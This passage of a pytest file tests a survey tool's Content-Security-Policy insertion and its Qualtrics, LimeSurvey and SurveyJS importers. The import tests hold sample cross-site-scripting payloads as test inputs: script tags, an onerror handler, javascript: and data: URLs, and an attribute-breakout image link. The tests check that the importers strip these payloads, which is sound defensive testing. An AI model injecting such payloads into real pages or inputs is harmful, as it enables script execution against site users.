    assert inline_script_hashes(crlf) == [f"'sha256-{lf}'"]


def test_with_the_page_the_inline_script_is_allowed_by_its_hash_alone():
    page = str(_bundle(_payload_document())["index.html"])
    script = re.search(r"<script>(.*?)</script>", page, re.DOTALL).group(1)
    digest = base64.b64encode(hashlib.sha256(script.encode()).digest()).decode()
    assert inline_script_hashes(page) == [f"'sha256-{digest}'"]
    policy = survey_csp(page)
    assert f"'sha256-{digest}'" in policy and "'unsafe-inline' " not in policy.split("style-src")[0]


def test_the_policy_goes_right_after_the_charset():
    policy = survey_csp()
    page = str(_bundle(_payload_document(), csp=policy)["index.html"])
    assert re.search(
        r'<head>\s*<meta charset="utf-8">\s*<meta http-equiv="Content-Security-Policy" content="',
        page,
    )
    plain = str(_bundle(_payload_document())["index.html"])
    assert "Content-Security-Policy" not in plain
    # A host writing it later replaces the one there, in the same place.
    again = insert_csp_meta(page, "default-src 'none'")
    assert again.count("Content-Security-Policy") == 1
    assert insert_csp_meta(plain, "default-src 'none'").count("Content-Security-Policy") == 1
    assert again.replace(
        insert_csp_meta(plain, "default-src 'none'").split("<title>")[0], ""
    ).startswith("<title>")
    assert (
        '<meta charset="utf-8">\n  <meta http-equiv="Content-Security-Policy" content="default-src &#x27;none&#x27;">'
        in again
    )
    closed = str(_bundle(_payload_document(), csp=policy)["closed.html"])
    assert re.search(r'<meta charset="utf-8">\s*<meta http-equiv="Content-Security-Policy"', closed)


@pytest.mark.parametrize(
    "page",
    [
        '<script>evil()</script><!doctype html><html><head><meta charset="utf-8">',
        '<!doctype html><html><head><script>evil()</script><meta charset="utf-8">',
        "<!doctype html><html><head><title>x</title>",
    ],
)
def test_a_page_that_does_not_start_as_the_runtimes_is_refused(page):
    with pytest.raises(ValueError, match="not a survey page"):
        insert_csp_meta(page, "default-src 'none'")


@pytest.mark.parametrize(
    "source", ["https://a.example; script-src *", "https://a b", "'unsafe-x'", '"x"']
)
def test_a_source_cannot_add_a_directive(source):
    with pytest.raises(ValueError, match="CSP source"):
        survey_csp(connect_src=[source])
    assert csp_meta(None) == ""


# ── Imports ──────────────────────────────────────────────────────────────────

_IMPORTED_BODY = (
    '<p>Intro</p><img src=x onerror="window.__pwned=1"><script>window.__pwned=1</script>'
    '<a href="javascript:window.__pwned=1">x</a>'
)


def _bodies(document: dict[str, Any]) -> list[str]:
    return [page["body"] for page in document["pages"] if page.get("body")]


def _imports_safely(result: Any) -> None:
    document = result.document
    for body in _bodies(document):
        _assert_harmless(body)
    assert "javascript" not in json.dumps(document.get("ui") or {})
    from_document(document)  # it loads


def test_a_qualtrics_file_brings_in_no_script():
    payload = json.loads((FIXTURES / "brand_pulse.qsf").read_text("utf-8"))
    for element in payload["SurveyElements"]:
        if element.get("Element") == "SQ" and element["Payload"].get("QuestionID") == "QID4":
            element["Payload"]["QuestionText"] = _IMPORTED_BODY
        if element.get("Element") == "SO":
            element["Payload"]["SurveyTermination"] = "Redirect"
            element["Payload"]["EOSRedirectURL"] = "javascript:window.__pwned=1"
    result = import_qsf(payload)
    _imports_safely(result)
    assert any("<p>Intro</p>" in body for body in _bodies(result.document))
    assert any("HTML left out" in w and "<script> removed" in w for w in result.warnings)
    # What was left out reads as sentences.
    left_out = [w for w in result.warnings if "HTML left out" in w]
    assert all(". the " not in w and "HTML left out. " in w for w in left_out), left_out
    assert any("is not imported" in w for w in result.warnings)


def test_a_limesurvey_file_brings_in_no_script():
    xml = (FIXTURES / "wellbeing_check.lss").read_text("utf-8")
    xml = xml.replace("<p>A few questions about you.</p>", _IMPORTED_BODY)
    xml = xml.replace("<p>Welcome! This takes about five minutes.</p>", _IMPORTED_BODY)
    xml = xml.replace("https://example.org/thanks", " JaVaScRiPt:window.__pwned=1")
    result = import_lss(xml)
    _imports_safely(result)
    assert "ui" not in result.document
    assert sum("HTML left out" in w for w in result.warnings) == 2


def test_a_surveyjs_file_brings_in_no_script():
    payload = json.loads((FIXTURES / "customer_pulse.surveyjs.json").read_text("utf-8"))
    payload["completedHtml"] = _IMPORTED_BODY
    payload["navigateToUrl"] = "data:text/html,<script>window.__pwned=1</script>"
    page = payload["pages"][0]
    for element in page["elements"]:
        if element.get("type") == "html":
            element["html"] = _IMPORTED_BODY
    page["elements"].append(
        {
            "type": "image",
            "name": "pic",
            "title": 'A "quoted" <b>title</b>',
            "imageLink": 'https://cdn.example/a.png" onerror="window.__pwned=1',
        }
    )
    result = import_surveyjs(copy.deepcopy(payload))
    _imports_safely(result)
    bodies = " ".join(_bodies(result.document))
    # The picture keeps its address and text, as attribute values.
    assert 'src="https://cdn.example/a.png&quot; onerror=&quot;window.__pwned=1"' in bodies
    assert 'alt="A &quot;quoted&quot; title"' in bodies
